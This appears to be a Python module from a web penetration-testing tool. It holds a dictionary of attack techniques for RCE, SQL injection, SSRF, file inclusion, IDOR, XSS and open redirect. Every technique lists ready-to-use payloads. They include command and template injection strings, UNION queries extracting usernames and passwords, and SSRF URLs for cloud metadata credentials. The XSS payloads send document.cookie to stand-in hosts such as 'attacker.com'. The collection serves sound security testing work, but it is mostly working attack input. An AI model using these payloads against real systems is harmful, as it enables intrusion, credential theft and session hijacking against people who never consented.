"""Static attack knowledge base — techniques, payloads, tools per attack type."""

ATTACK_KNOWLEDGE: dict[str, dict] = {
    "RCE": {
        "description": "Remote Code Execution — attacker can run arbitrary commands on the server.",
        "severity": 10,
        "color": "#ff0000",
        "techniques": [
            {
                "name": "OS Command Injection",
                "description": "Inject shell metacharacters to chain or replace commands executed server-side.",
                "payloads": [
                    "; id",
                    "| whoami",
                    "$(cat /etc/passwd)",
                    "`sleep 5`",
                    "|| ping -c 3 BURP_COLLAB ||",
                    "%0a id",
                ],
                "tools": ["Commix", "Burp Suite Intruder"],
                "references": [
                    "https://owasp.org/www-community/attacks/Command_Injection",
                    "https://portswigger.net/web-security/os-command-injection",
                ],
            },
            {
                "name": "Code Injection (eval / template)",
                "description": "Supply input interpreted as code by eval(), template engines, or expression parsers.",
                "payloads": [
                    "${7*7}",
                    "{{7*7}}",
                    "__import__('os').system('id')",
                    "#{7*7}",
                    "<%= system('id') %>",
                ],
                "tools": ["tplmap", "Burp Suite"],
                "references": [
                    "https://portswigger.net/web-security/server-side-template-injection",
                ],
            },
        ],
    },
    "SQLi": {
        "description": "SQL Injection — attacker can read, modify, or delete database contents.",
        "severity": 9,
        "color": "#ff0066",
        "techniques": [
            {
                "name": "Union-Based SQLi",
                "description": "Append UNION SELECT to extract data from other tables in a single response.",
                "payloads": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT username,password FROM users--",
                    "1 UNION SELECT 1,2,3--",
                ],
                "tools": ["sqlmap", "Burp Suite"],
                "references": [
                    "https://portswigger.net/web-security/sql-injection/union-attacks",
                ],
            },
            {
                "name": "Blind Boolean-Based SQLi",
                "description": "Infer data one bit at a time by observing true/false differences in the response.",
                "payloads": [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND SUBSTRING(username,1,1)='a'--",
                    "' AND (SELECT COUNT(*) FROM users)>0--",
                ],
                "tools": ["sqlmap", "Burp Suite Intruder"],
                "references": [
                    "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                ],
            },
            {
                "name": "Time-Based Blind SQLi",
                "description": "Use conditional time delays to extract data when no visible output difference exists.",
                "payloads": [
                    "' AND SLEEP(5)--",
                    "'; WAITFOR DELAY '0:0:5'--",
                    "' AND IF(1=1,SLEEP(5),0)--",
                    "1; SELECT pg_sleep(5)--",
                ],
                "tools": ["sqlmap", "Burp Suite"],
                "references": [
                    "https://portswigger.net/web-security/sql-injection/blind",
                ],
            },
        ],
    },
    "SSRF": {
        "description": "Server-Side Request Forgery — trick the server into making requests to internal or external resources.",
        "severity": 8,
        "color": "#aa00ff",
        "techniques": [
            {
                "name": "Internal Service Access",
                "description": "Access internal services (admin panels, databases) via localhost or private IPs.",
                "payloads": [
                    "http://127.0.0.1:80",
                    "http://localhost:8080/admin",
                    "http://0.0.0.0:22",
                    "http://[::1]:443",
                    "http://0x7f000001",
                ],
                "tools": ["Burp Collaborator", "SSRFmap"],
                "references": [
                    "https://portswigger.net/web-security/ssrf",
                ],
            },
            {
                "name": "Cloud Metadata Exfiltration",
                "description": "Reach the cloud metadata endpoint to steal IAM credentials and instance info.",
                "payloads": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://100.100.100.200/latest/meta-data/",
                ],
                "tools": ["SSRFmap", "Burp Suite"],
                "references": [
                    "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html",
                ],
            },
            {
                "name": "Protocol Smuggling",
                "description": "Abuse URL parsers to access non-HTTP protocols (file, gopher, dict).",
                "payloads": [
                    "file:///etc/passwd",
                    "gopher://127.0.0.1:6379/_INFO",
                    "dict://127.0.0.1:6379/INFO",
                    "file:///proc/self/environ",
                ],
                "tools": ["Gopherus", "SSRFmap"],
                "references": [
                    "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html",
                ],
            },
        ],
    },
    "LFI": {
        "description": "Local File Inclusion — read arbitrary files from the server filesystem.",
        "severity": 7,
        "color": "#ff4444",
        "techniques": [
            {
                "name": "Path Traversal",
                "description": "Use ../ sequences to escape the web root and read system files.",
                "payloads": [
                    "../../../../etc/passwd",
                    "..\\..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                ],
                "tools": ["Burp Suite Intruder", "ffuf"],
                "references": [
                    "https://portswigger.net/web-security/file-path-traversal",
                ],
            },
            {
                "name": "PHP Wrappers",
                "description": "Use PHP stream wrappers to read source code or execute commands.",
                "payloads": [
                    "php://filter/convert.base64-encode/resource=index.php",
                    "php://input",
                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
                    "expect://id",
                ],
                "tools": ["Burp Suite", "curl"],
                "references": [
                    "https://www.php.net/manual/en/wrappers.php",
                ],
            },
            {
                "name": "Log Poisoning",
                "description": "Inject PHP code into log files, then include the log via LFI to achieve RCE.",
                "payloads": [
                    "/var/log/apache2/access.log",
                    "/var/log/nginx/access.log",
                    "/proc/self/environ",
                    "/var/log/mail.log",
                ],
                "tools": ["Burp Suite", "curl"],
                "references": [
                    "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html",
                ],
            },
        ],
    },
    "IDOR": {
        "description": "Insecure Direct Object Reference — access other users' data by changing object IDs.",
        "severity": 6,
        "color": "#00aaff",
        "techniques": [
            {
                "name": "Horizontal Privilege Escalation",
                "description": "Change user/object IDs to access data belonging to other users at the same privilege level.",
                "payloads": [
                    "/api/users/1001 -> /api/users/1002",
                    "/orders?id=500 -> /orders?id=501",
                    "/profile?user_id=me -> /profile?user_id=victim",
                    "/documents/abc-uuid -> /documents/def-uuid",
                ],
                "tools": ["Autorize (Burp)", "Burp Suite Repeater"],
                "references": [
                    "https://portswigger.net/web-security/access-control/idor",
                ],
            },
            {
                "name": "Vertical Access Escalation",
                "description": "Access admin-only endpoints or resources by manipulating role/privilege identifiers.",
                "payloads": [
                    "/admin/users (as regular user)",
                    "/api/settings?role=admin",
                    "X-User-Role: admin (header injection)",
                    "/api/v1/internal/config",
                ],
                "tools": ["Autorize (Burp)", "Burp Suite"],
                "references": [
                    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema",
                ],
            },
        ],
    },
    "XSS": {
        "description": "Cross-Site Scripting — inject client-side scripts to steal sessions, deface pages, or redirect users.",
        "severity": 5,
        "color": "#ff8800",
        "techniques": [
            {
                "name": "Reflected XSS",
                "description": "Payload is included in the HTTP response immediately after being sent in the request.",
                "payloads": [
                    '<script>alert(1)</script>',
                    '"><img src=x onerror=alert(1)>',
                    "javascript:alert(1)",
                    "'-alert(1)-'",
                    '<svg onload=alert(1)>',
                    '"><svg/onload=fetch("https://BURP_COLLAB?c="+document.cookie)>',
                ],
                "tools": ["Dalfox", "XSStrike", "Burp Suite"],
                "references": [
                    "https://portswigger.net/web-security/cross-site-scripting/reflected",
                ],
            },
            {
                "name": "Stored XSS",
                "description": "Payload is permanently stored on the server and served to other users viewing the page.",
                "payloads": [
                    '<script>fetch("https://attacker.com?c="+document.cookie)</script>',
                    '<img src=x onerror="new Image().src=\'https://attacker.com?c=\'+document.cookie">',
                    "<details open ontoggle=alert(1)>",
                ],
                "tools": ["Burp Suite", "XSStrike"],
                "references": [
                    "https://portswigger.net/web-security/cross-site-scripting/stored",
                ],
            },
            {
                "name": "DOM-Based XSS",
                "description": "Payload is processed entirely in the browser via JavaScript without server involvement.",
                "payloads": [
                    "#<img src=x onerror=alert(1)>",
                    "javascript:alert(document.domain)",
                    "'-alert(1)-'",
                    "{{constructor.constructor('alert(1)')()}}",
                ],
                "tools": ["DOM Invader (Burp)", "Dalfox"],
                "references": [
                    "https://portswigger.net/web-security/cross-site-scripting/dom-based",
                ],
            },
        ],
    },
    "Open Redirect": {
        "description": "Open Redirect — trick users into visiting malicious sites via a trusted domain redirect.",
        "severity": 4,
        "color": "#ffaa00",
        "techniques": [
            {
                "name": "URL Parameter Redirect",
                "description": "Abuse redirect/callback parameters that accept arbitrary URLs without validation.",
                "payloads": [
                    "https://evil.com",
                    "//evil.com",
                    "/\\evil.com",
                    "https://trusted.com@evil.com",
                    "/%0d%0aLocation:%20https://evil.com",
                    "https://evil.com%23.trusted.com",
                ],
                "tools": ["Burp Suite", "OpenRedireX"],
                "references": [
                    "https://portswigger.net/kb/issues/00500100_open-redirection-reflected",
                ],
            },
            {
                "name": "Login Flow Redirect",
                "description": "Exploit post-login redirect parameters to send users to phishing pages after authentication.",
                "payloads": [
                    "/login?next=https://evil.com",
                    "/login?return_url=//evil.com",
                    "/auth/callback?redirect_uri=https://evil.com",
                    "/sso/login?continue=https://evil.com",
                ],
                "tools": ["Burp Suite", "curl"],
                "references": [
                    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect",
                ],
            },
        ],
    },
}


def get_techniques(attack_type: str) -> list[dict]:
    """Return technique list for a given attack type."""
    entry = ATTACK_KNOWLEDGE.get(attack_type)
    if not entry:
        return []
    return entry["techniques"]


def get_attack_info(attack_type: str) -> dict | None:
    """Return full knowledge entry (description, severity, color, techniques)."""
    return ATTACK_KNOWLEDGE.get(attack_type)
